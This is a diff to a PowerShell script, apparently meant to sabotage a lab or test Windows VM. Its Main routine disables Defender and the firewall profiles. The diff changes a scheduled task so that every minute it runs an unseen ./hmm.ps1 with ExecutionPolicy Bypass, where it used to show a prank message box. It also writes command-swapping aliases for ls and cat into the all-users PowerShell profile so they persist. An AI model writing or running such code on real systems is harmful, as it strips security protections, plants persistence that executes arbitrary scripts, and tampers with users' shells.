@@ -21,8 +21,9 @@ function CreateLocalUsers(){
     }
 }
 
-function TaskCreation(){
-    schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass -Command ""&" {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"" /sc minute /mo 1 /ru IEUser
+function TaskCreations(){
+    #schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass -Command ""&" {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"" /sc minute /mo 1 /ru IEUser
+    schtasks /create /tn whoami /tr "powershell -ExecutionPolicy Bypass ./hmm.ps1" /sc minute /mo 1 /ru IEUser
 }
 # powershell -ExecutionPolicy Bypass -Command "&" "{[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"
 # function AnnoyingAlert(){
@@ -37,6 +38,14 @@ function TaskCreation(){
 function SetMemeAliases()
 {
     Set-Alias -Name ls -Value "cat" -Option AllScope
+    Set-Alias -Name cat -Value "dir" -Option AllScope
+    Export-Alias -Path C:\Aliases.txt
+
+    if (!(Test-Path -Path $PROFILE.AllUsersAllHosts)) {
+        New-Item -ItemType File -Path $PROFILE.AllUsersAllHosts -Force
+        Get-Content C:\Aliases.txt >> $PROFILE.AllUsersAllHosts
+      }
+
 }
 
 function CreateLocalGroup(){
@@ -57,7 +66,7 @@ function Main(){
 
     DisableMD
     DisableFirewallProfiles
-    TaskCreation
+    TaskCreations
     SetMemeAliases
 
 }
